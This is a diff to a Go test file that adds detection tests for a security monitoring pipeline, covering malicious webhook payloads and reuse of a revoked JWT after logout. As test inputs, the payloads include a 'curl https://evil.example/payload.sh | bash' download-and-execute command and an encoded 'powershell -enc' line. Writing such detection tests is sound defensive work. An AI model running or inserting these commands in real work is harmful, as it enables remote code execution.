@@ -1118,3 +1118,69 @@ func TestPageMethodBypass_NormalASPX(t *testing.T) {
 		t.Error("should NOT alert for normal .aspx access without PageMethod suffix")
 	}
 }
+
+func TestInboundWebhookScanner_CommandPayload(t *testing.T) {
+	cp := newCapPipeline()
+	f := startedFortress(t, cp.AlertPipeline)
+
+	ev := makeAPIRequest("/webhooks/github", "POST", "", "", "")
+	ev.Details["headers"] = "X-GitHub-Event: workflow_job"
+	ev.Details["body"] = `{"steps":"curl https://evil.example/payload.sh | bash"}`
+
+	f.HandleEvent(ev)
+
+	if !cp.hasAlertType("webhook_infra_abuse") {
+		t.Error("expected webhook_infra_abuse alert for command-bearing webhook payload")
+	}
+}
+
+func TestInboundWebhookScanner_UnsignedBlobSmuggling(t *testing.T) {
+	cp := newCapPipeline()
+	f := startedFortress(t, cp.AlertPipeline)
+
+	ev := makeAPIRequest("/hooks/slack", "POST", "", "", "")
+	ev.Details["body"] = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
+	ev.UserAgent = "Slackbot 1.0"
+
+	f.HandleEvent(ev)
+
+	if !cp.hasAlertType("webhook_payload_smuggling") {
+		t.Error("expected webhook_payload_smuggling alert for unsigned encoded webhook payload")
+	}
+}
+
+func TestInboundWebhookScanner_HighEntropyEncodedExec(t *testing.T) {
+	cp := newCapPipeline()
+	f := startedFortress(t, cp.AlertPipeline)
+
+	ev := makeAPIRequest("/automation/zapier", "POST", "", "", "")
+	ev.Details["headers"] = "X-Zapier-Webhook: 1"
+	ev.Details["body"] = `{"script":"powershell -enc QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo0MTIzNDU2Nzg5MEFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaNDEyMzQ1Njc4OTBBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWjQxMjM0NTY3ODkwQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo0MTIzNDU2Nzg5MEFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFla"}`
+
+	f.HandleEvent(ev)
+
+	if !cp.hasAlertType("webhook_infra_abuse") {
+		t.Error("expected webhook_infra_abuse alert for encoded execution payload")
+	}
+	if !cp.hasAlertType("webhook_payload_smuggling") {
+		t.Error("expected webhook_payload_smuggling alert for high-entropy webhook blob")
+	}
+}
+
+func TestFortress_HandleEvent_RevokedJWTOnAPIRequest(t *testing.T) {
+	cp := newCapPipeline()
+	f := startedFortress(t, cp.AlertPipeline)
+
+	logout := core.NewSecurityEvent("test", "logout", core.SeverityInfo, "logout")
+	logout.Details["jti"] = "api-jti-1"
+	f.HandleEvent(logout)
+
+	token := "eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJhcGktanRpLTEifQ.signature"
+	ev := makeAPIRequest("/api/admin/users", "GET", "alice", "", "admin")
+	ev.Details["authorization"] = "Bearer " + token
+	f.HandleEvent(ev)
+
+	if !cp.hasAlertType("token_reuse_post_logout") {
+		t.Error("expected token_reuse_post_logout alert for revoked JWT reused on api_request")
+	}
+}
